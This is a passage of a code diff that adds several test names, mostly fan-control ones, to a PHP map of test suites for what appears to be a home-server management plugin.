+                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanAtLeft', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupSkipGreeting', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testLights', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
+          'hardening' => ['testRequestTypes', 'testRunDirLeftovers', 'testRunDirCrashLoop', 'testRunDirLink', 'testRunDirBudget', 'testDeskLoadOrder', 'testRunDirAudit', 'testRunDirRunCap', 'testRunDirReport', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerGeneration', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testCleanupPurgeEnds', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportWatch', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin', 'testHostShell', 'testOnlyOfficeCron'],
           'strings' => ['testStrings', 'testUnraidWords', 'testNoNightWords'],
           'fanboy' => ['testFanboyPublic', 'testFanboyMetrics', 'testCaretakerNewcomers', 'testFanboyNoWrite', 'testFanboyDetect', 'testFanboySituations', 'testFanboyIdentity', 'testFanboyReport', 'testFanboyHints', 'testFanboyPage',
-                       'testFanboyWrite', 'testFanboyControl', 'testFanboyAlarms', 'testFanboyForeignConfirm', 'testFanboyChipMissing', 'testFanboyBoards', 'testFanboySteps', 'testFanboyZones',
+                       'testFanboyWrite', 'testFanboyControl', 'testFanboyReadCadence', 'testFanboyAlarms', 'testFanboyForeignConfirm', 'testFanboyChipMissing', 'testFanboyBoards', 'testFanboySteps', 'testFanboyZones',
                        'testFanboyProcesses', 'testFanboyDrivers', 'testFanboyStopScripts', 'testFanboyState',
-                       'testFanboyBack', 'testFanboyGuardCron', 'testFanboyWaz', 'testFanboyHistoryPart', 'testFanboyMeasureProgress', 'testFanboyFanLook', 'testFanboyDesk', 'testFanboyUx', 'testFanboyOverview', 'testFanboyHistoryLeads', 'testFanboyHistoryCurves', 'testFanboyDeskWords', 'testFanboyHistoryThin', 'testFanboyAvatar', 'testFanboyCount', 'testFanboyHottestKinds', 'testFanboyRound3Words', 'testFanboyStandsKick', 'testFanboyNvmeWarm', 'testFanboyProposeKinds', 'testFanboyReact', 'testFanboyTemps', 'testFanboyCpuOwn', 'testFanboyPresetsMirror', 'testFanboyR5Subjects', 'testFanboyR5GuardZone', 'testFanboyR5TrimHeld', 'testFanboyR5Names', 'testFanboyR5ChipGone', 'testFanboyR5Moved', 'testFanboyR5NoDriftAtFull', 'testFanboyR5Obeys', 'testFanboyR5GiveBackSafe', 'testFanboyR5Sane', 'testFanboyR5Refused', 'testFanboyR5Detect', 'testFanboyR5DisksAsleep', 'testFanboyR5TwoChips', 'testFanboyR6WatchLearn', 'testFanboyR6WatchRules', 'testFanboyR6WarmNow', 'testFanboyR6ShowStep', 'testFanboyR6ShowRefused', 'testFanboyR6ShowControl', 'testFanboyR6OldDisks', 'testFanboyR7FullOnObeys', 'testFanboyR7ControlFullOn', 'testFanboyR7Fixed', 'testFanboyR7NotAController', 'testFanboyR7CardsKeepSize', 'testFanboyR7TestLongEnough', 'testFanboyR8IgnoredLate', 'testFanboyR8FullLongEnough', 'testFanboyR8Quiet', 'testFanboyR8QuietGuards', 'testFanboyR8QuietSafety', 'testFanboyR8FoundNext', 'testFanboyR8Assign', 'testFanboyR9Kick', 'testFanboyR9Safety', 'testFanboyR9Now', 'testFanboyR9CpuOwn', 'testFanboyR10Notify', 'testFanboyR11Heard', 'testFanboyR11StopVerdict', 'testFanboyR11StaleNext', 'testFanboyR11ProgressNext', 'testFanboyR12Standstill', 'testFanboyR12Warm', 'testFanboyR12Control', 'testFanboyR12CpuRole', 'testFanboyR12CpuMeasure', 'testFanboyR12CpuControl', 'testFanboyR12CpuGone', 'testFanboyR12FixSpikes', 'testFanboyR12FixControl', 'testFanboyR12FixConfirm', 'testFanboyNetDrift', 'testFanboyProposeSaves', 'testFanboyZonesWords', 'testFanboyFourPoints', 'testFanboyLookKeeps', 'testFanboyKickStartSecs', 'testFanboyReloadDrift', 'testFanboyNet', 'testFanboyNetTakeOver', 'testFanboyR12Curve', 'testFanboyR12CurveEffective', 'testFanboyR12AutoSeen', 'testFanboyR12Look', 'testFanboyR13Compat', 'testFanboyR13Curves', 'testFanboyR13Refused', 'testFanboyR13Devs', 'testFanboyR13DevsControl', 'testFanboyR14Plan', 'testFanboyR14Look', 'testFanboySetupFanPlan', 'testFanboyDashHours', 'testFanboyTimes', 'testFanboySsdSleeps', 'testFanboyCpuFloorCurve',
+                       'testFanboyBack', 'testFanboyGuardCron', 'testFanboyWaz', 'testFanboyHistoryPart', 'testFanboyMeasureProgress', 'testFanboyFanLook', 'testFanboyDesk', 'testFanboyUx', 'testFanboyOverview', 'testFanboyHistoryLeads', 'testFanboyHistoryCurves', 'testFanboyDeskWords', 'testFanboyHistoryThin', 'testFanboyAvatar', 'testFanboyCount', 'testFanboyHottestKinds', 'testFanboyRound3Words', 'testFanboyStandsKick', 'testFanboyNvmeWarm', 'testFanboyProposeKinds', 'testFanboyReact', 'testFanboyTemps', 'testFanboyCpuOwn', 'testFanboyPresetsMirror', 'testFanboyR5Subjects', 'testFanboyR5GuardZone', 'testFanboyR5TrimHeld', 'testFanboyR5Names', 'testFanboyR5ChipGone', 'testFanboyR5Moved', 'testFanboyR5NoDriftAtFull', 'testFanboyR5Obeys', 'testFanboyR5GiveBackSafe', 'testFanboyR5Sane', 'testFanboyR5Refused', 'testFanboyR5Detect', 'testFanboyR5DisksAsleep', 'testFanboyR5TwoChips', 'testFanboyR6WatchLearn', 'testFanboyR6WatchRules', 'testFanboyR6WarmNow', 'testFanboyR6ShowStep', 'testFanboyR6ShowRefused', 'testFanboyR6ShowControl', 'testFanboyR6OldDisks', 'testFanboyR7FullOnObeys', 'testFanboyR7ControlFullOn', 'testFanboyR7Fixed', 'testFanboyR7NotAController', 'testFanboyR7CardsKeepSize', 'testFanboyR7TestLongEnough', 'testFanboyR8IgnoredLate', 'testFanboyR8FullLongEnough', 'testFanboyR8Quiet', 'testFanboyR8QuietGuards', 'testFanboyR8QuietSafety', 'testFanboyR8FoundNext', 'testFanboyR8Assign', 'testFanboyR9Kick', 'testFanboyR9Safety', 'testFanboyR9Now', 'testFanboyR9CpuOwn', 'testFanboyR10Notify', 'testFanboyR11Heard', 'testFanboyR11StopVerdict', 'testFanboyR11StaleNext', 'testFanboyR11ProgressNext', 'testFanboyR12Standstill', 'testFanboyR12Warm', 'testFanboyR12Control', 'testFanboyR12CpuRole', 'testFanboyR12CpuMeasure', 'testFanboyR12CpuControl', 'testFanboyR12CpuGone', 'testFanboyR12FixSpikes', 'testFanboyR12FixControl', 'testFanboyR12FixConfirm', 'testFanboyNetDrift', 'testFanboyProposeSaves', 'testFanboyZonesWords', 'testFanboyFourPoints', 'testFanboyLookKeeps', 'testFanboyKickStartSecs', 'testFanboyReloadDrift', 'testFanboyNet', 'testFanboyNetTakeOver', 'testFanboyDriveMain', 'testFanboyAside', 'testFanboyAsideControl', 'testFanboyR12Curve', 'testFanboyR12CurveEffective', 'testFanboyR12AutoSeen', 'testFanboyR12Look', 'testFanboyR13Compat', 'testFanboyR13Curves', 'testFanboyR13Refused', 'testFanboyR13Devs', 'testFanboyR13DevsControl', 'testFanboyR14Plan', 'testFanboyR14Look', 'testFanboySetupFanPlan', 'testFanboyDashHours', 'testFanboyTimes', 'testFanboySsdSleeps', 'testFanboyCpuFloorCurve',
                        'testFanboyDashTile', 'testFanboyDashSource', 'testFanboyDashSetting', 'testFanboyDashHistory', 'testFanboyDashFans', 'testFanboyDashCards', 'testFanboyDashAsleep', 'testFanboyDashSplitter', 'testFanboyDashDefault', 'testFanboyDashCpuRest', 'testFanboyZoneSources', 'testFanboyCpuOwnWheel', 'testFanboySetupWaits', 'testFanboySetupPlaces', 'testFanboyArtClipped', 'testFanboySetupFlow', 'testFanboyEmptyOutput', 'testFanboyZonesDraft', 'testFanboyWarmOverride', 'testFanboyStartWait', 'testFanboyKindGoal',
                        'testFanboyLookReverse', 'testFanboyLookDash', 'testFanboyLookKeys', 'testFanboyLookGap', 'testFanboyLookTipAir', 'testFanboyZoneStacks', 'testFanboyChipTable', 'testFanboyChipRead', 'testFanboyChipState', 'testFanboyChipReport', 'testFanboyChipRisk', 'testFanboyNoFanChip', 'testFanboyTempsMissing', 'testFanboyDoctor', 'testFanboyUsbStick', 'testFanboyCurveFloorKinds', 'testFanboyCurvePush'],
           'alwayson' => ['testAlwaysOnStopWhy', 'testAlwaysOnBackCheck', 'testAlwaysOnMissedRuns', 'testAlwaysOnHoldBarred', 'testAlwaysOnHoldJudge', 'testAlwaysOnHoldLook', 'testAlwaysOnMirror', 'testAlwaysOnAgentKeeps', 'testAlwaysOnRamJob', 'testAlwaysOnControlRam', 'testAlwaysOnControlProc', 'testAlwaysOnSaveReachesControl', 'testAlwaysOnLaunch', 'testAlwaysOnReleaseSteps', 'testAlwaysOnNight', 'testAlwaysOnHandBack', 'testAlwaysOnUnknown', 'testAlwaysOnThroughStop', 'testAlwaysOnBoot', 'testAlwaysOnStoppedView'],
